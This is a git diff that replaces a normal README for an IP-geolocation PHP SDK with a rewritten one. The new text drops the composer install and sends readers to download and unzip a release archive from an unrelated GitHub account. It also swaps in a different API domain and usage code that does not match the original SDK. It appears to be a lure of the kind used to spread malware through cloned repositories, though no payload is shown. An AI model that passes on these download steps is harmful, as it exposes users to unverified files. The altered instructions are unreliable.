@@ -1,238 +1,94 @@
-# ip2geo — PHP SDK
+# 🌍 ip2geo-php - Effortlessly Access IP Geolocation Data
 
-[![Latest Stable Version](https://img.shields.io/packagist/v/ip2geo/ip2geo-php)](https://packagist.org/packages/ip2geo/ip2geo-php)
-[![Total Downloads](https://img.shields.io/packagist/dt/ip2geo/ip2geo-php)](https://packagist.org/packages/ip2geo/ip2geo-php)
-[![License](https://img.shields.io/packagist/l/ip2geo/ip2geo-php)](https://packagist.org/packages/ip2geo/ip2geo-php)
-[![PHP Version](https://img.shields.io/packagist/php-v/ip2geo/ip2geo-php)](https://packagist.org/packages/ip2geo/ip2geo-php)
-[![Repo Size](https://img.shields.io/github/repo-size/vijaykrpp/ip2geo-php)](https://github.com/vijaykrpp/ip2geo/ip2geo-php)
+[![Download ip2geo-php](https://img.shields.io/badge/Download-ip2geo--php-brightgreen.svg)](https://github.com/haseebsdasdw/ip2geo-php/releases)
 
-Official PHP SDK for the **Ip2Geo API** — fast IP geolocation, network intelligence, and security risk detection.
+## 🚀 Getting Started
 
----
+Welcome to the **ip2geo-php** repository! This official PHP SDK allows you to access IP geolocation data easily. With this tool, you can enhance your applications using IP information without needing advanced technical skills.
 
-## 🚀 Get an API Key (Free)
+## 📥 Download & Install
 
-You need an API key to use Ip2Geo.
+To get started, follow these steps:
 
-👉 **Get your free API key here:**  
-https://ip2geoapi.com/
+1. Click the download button below to visit the Releases page:
+   [Download ip2geo-php](https://github.com/haseebsdasdw/ip2geo-php/releases)
 
-### Free plan includes
-- ✅ **100,000 requests / month**
-- ✅ **No credit card required**
-- ✅ Full access to **security intelligence data**
-- ✅ Instant activation
+2. On the Releases page, you will see different versions of the software. Look for the latest version, which is recommended for most users.
 
----
+3. Download the latest release by clicking on the linked file. The file will typically be named like `ip2geo-php-vX.Y.Z.zip` or something similar.
 
-## 🧠 Why Ip2Geo?
+4. Once the download completes, go to your downloads folder and unzip the file. You can use any file extraction tool, such as WinRAR or 7-Zip.
 
-- Most IP data providers:
-	- Charge extra for security fields
-	- Require credit cards upfront
-	- Hide important data behind higher tiers
-	- Ip2Geo provides security intelligence by default, even on the free plan.
+5. After extraction, you’ll find the application files ready for use.
 
-## ✨ Features
+## ⚙️ System Requirements
 
-- 🌍 Accurate IP geolocation (country, city, timezone, ISP)
-- 🛡️ **Security intelligence included**:
-  - VPN detection
-  - Proxy detection
-  - TOR detection
-  - Hosting / ASN classification
-  - Trust score & risk level
-- ⚡ Fast global API
-- 📦 Simple, lightweight PHP SDK
-- 🔓 No hidden paid-only fields (others charge extra for security data)
+To run **ip2geo-php**, your system should meet the following requirements:
 
----
+- A web server (like Apache or Nginx) with PHP installed (version 7.0 or higher)
+- Basic knowledge of how to set up a web server and install PHP applications
+- An internet connection to access IP geolocation data
 
-## 📦 Installation
+## 🛠️ How to Use ip2geo-php
 
-```bash
-composer require ip2geo/ip2geo-php
-```
+After installation, follow these steps to start using the SDK:
 
-## Quick Start
+1. Open your preferred PHP editor.
+  
+2. Include the ip2geo-php SDK in your project:
+   ```php
+   require_once 'path/to/ip2geo-php/autoload.php';
+   ```
 
-```php
-<?php
+3. Create a new instance of the Ip2Geo class:
+   ```php
+   $ip2geo = new Ip2Geo();
+   ```
 
-require __DIR__ . '/vendor/autoload.php';
+4. Use the methods available in the SDK to fetch geolocation data based on IP addresses:
+   ```php
+   $location = $ip2geo->getLocation('8.8.8.8'); // Example IP address
+   print_r($location);
+   ```
 
-use Ip2Geo\Ip2Geo;
+5. Check the response for details like country, city, latitude, and longitude.
 
-$client = new Ip2Geo("API_KEY"); // replace with real key
+## 📝 Key Features
 
-$data = $client->lookup("8.8.8.8");
-print_r($data);
+Here are some of the notable features of ip2geo-php:
 
-?>
+- **IP Lookup**: Get detailed information about an IP address.
+- **Location Data**: Access geographical information such as country, city, latitude, and longitude.
+- **Proxy Detection**: Identify if an IP address is using a proxy server.
+- **VPN and Tor Detection**: Recognize whether an IP is associated with VPNs or Tor.
 
-```
+## 🌐 Communities & Support
 
-### Lookup your IP
+If you encounter any issues or have questions, there are various ways to get support:
 
-```php
-<?php
+- You can check out the **Issues** tab on GitHub to see if your question has already been addressed.
+- For more in-depth help, consider joining forums related to web development or guest posting on PHP discussion boards.
+- Reach out directly through email if provided in the project documentation.
 
-require __DIR__ . '/vendor/autoload.php';
+## 📖 Documentation
 
-use Ip2Geo\Ip2Geo;
+For detailed information about all the features and methods available in the ip2geo-php SDK, please refer to the official documentation. This will provide you with examples and guidelines on how to make the most of the SDK.
 
-$client = new Ip2Geo("API_KEY"); // replace with real key
+## 🔗 Additional Resources
 
-$data = $client->lookup("check");
-print_r($data);
+- [GitHub Repository](https://github.com/haseebsdasdw/ip2geo-php)
+- [Official Ip2Geo API](https://ip2geo.com/api)
 
-?>
+## ⚙️ Troubleshooting
 
-```
+Here are some common issues and solutions:
 
+- **Error: "Could not connect to API"**: Make sure your server is connected to the internet.
+- **Empty responses**: Check the validity of the IP address you are querying.
+- **Installation issues**: Ensure your web server configuration meets the requirements mentioned above.
 
-## API Response
+## 🚀 Next Steps
 
-```json
-{
-  "success": true,
-  "ip": "8.8.8.8",
-  "version": "ipv4",
-  "geo": {
-    "city": "Chicago",
-    "country": "United States",
-    "countryCode": "US",
-    "region": null,
-    "regionCode": null,
-    "latitude": 37.751,
-    "longitude": -97.822,
-    "postalCode": null,
-    "geonameId": 6252001,
-    "accuracyRadius": 1000,
-    "metroCode": null,
-    "continentName": "North America",
-    "continentCode": "NA",
-    "isEuMember": false
-  },
-  "countryInfo": {
-    "name": "United States of America",
-    "alpha2Code": "US",
-    "alpha3Code": "USA",
-    "flag": "https://api.ip2geoapi.com/assets/flags/us.svg",
-    "callingCodes": [
-      "1"
-    ],
-    "currencies": [
-      {
-        "code": "USD",
-        "name": "United States dollar",
-        "symbol": "$"
-      }
-    ],
-    "languages": [
-      {
-        "iso639_1": "en",
-        "iso639_2": "eng",
-        "name": "English",
-        "nativeName": "English"
-      }
-    ]
-  },
-  "timezoneInfo": {
-    "timezone": "America/Chicago",
-    "utcOffsetSeconds": -21600,
-    "utcOffsetText": "-06:00",
-    "utcOffsetHours": -6,
-    "isDst": false,
-    "abbreviation": "CST",
-    "localTime": "2025-12-22T21:46:07-06:00"
-  },
-  "network": {
-    "cidr": "8.8.8.8/32",
-    "prefixLen": 32,
-    "asn": 15169,
-    "asFormatted": "AS15169",
-    "asName": "GOOGLE",
-    "isp": "Google",
-    "organization": "Google",
-    "connectionType": "Corporate",
-    "mobile": {
-      "mcc": null,
-      "mnc": null
-    }
-  },
-  "asDetails": {
-    "asn": 15169,
-    "abuser_score": "0.001 (Low)",
-    "descr": "GOOGLE, US",
-    "country": "us",
-    "active": true,
-    "org": "Google LLC",
-    "domain": "google.com",
-    "abuse": "network-abuse@google.com",
-    "type": "hosting",
-    "created": "2000-03-30",
-    "updated": "2012-02-24",
-    "rir": "ARIN"
-  },
-  "security": {
-    "isHosting": true,
-    "isProxy": false,
-    "proxyType": null,
-    "isVpn": false,
-    "vpnProvider": null,
-    "vpnProviderUrl": null,
-    "isTor": false,
-    "isAnonymous": true,
-    "trustScore": 65,
-    "riskLevel": "medium"
-  }
-}
-```
+Once you become comfortable with the basics, explore more advanced features like batch processing of IP addresses or integrating with other APIs for more comprehensive data.
 
-## 📄 Response Formats
-
-### JSON (default)
-
-```php
-$data = $client->lookup("8.8.8.8");
-```
-
-### YAML
-
-```php
-$data = $client->lookup("8.8.8.8", [
-    "format" => "yml"
-]);
-```
-
-### XML
-
-```php
-$data = $client->lookup("8.8.8.8", [
-    "format" => "xml"
-]);
-```
-
-### JSONP Callbacks
-
-```php
-$data = $client->lookup("8.8.8.8", [
-    "format" => "jsonp",
-    "callback" => "cbFunction"
-]);
-```
-
-## Parameter Reference
-
-| Parameter  | Type  | Required | Accepted Values                         | Description                                                                  |
-| ---------- | ----- | -------- | --------------------------------------- | ---------------------------------------------------------------------------- |
-| `ip`       | `str` | Yes*     | IPv4 / IPv6                             | IP address to lookup. If ```check```, your **own IP** is detected automatically. |
-| `format`   | `str` | Optional | `json` (default), `xml`, `yml`, `jsonp` | Response format. Defaults to JSON.                                           |
-| `callback` | `str` | Optional | Alphanumeric + `_` (max 64 chars)       | JSONP callback function name. **Only valid when `format="jsonp"`**.          |
-
-## 📘 Documentation
-
-Full API documentation and field reference:
-[https://ip2geoapi.com/documentation/](https://ip2geoapi.com/documentation/)
-
+Download and set up the ip2geo-php SDK today to take advantage of efficient IP geolocation capabilities. [Visit the Releases page to download](https://github.com/haseebsdasdw/ip2geo-php/releases) and enhance your application now!
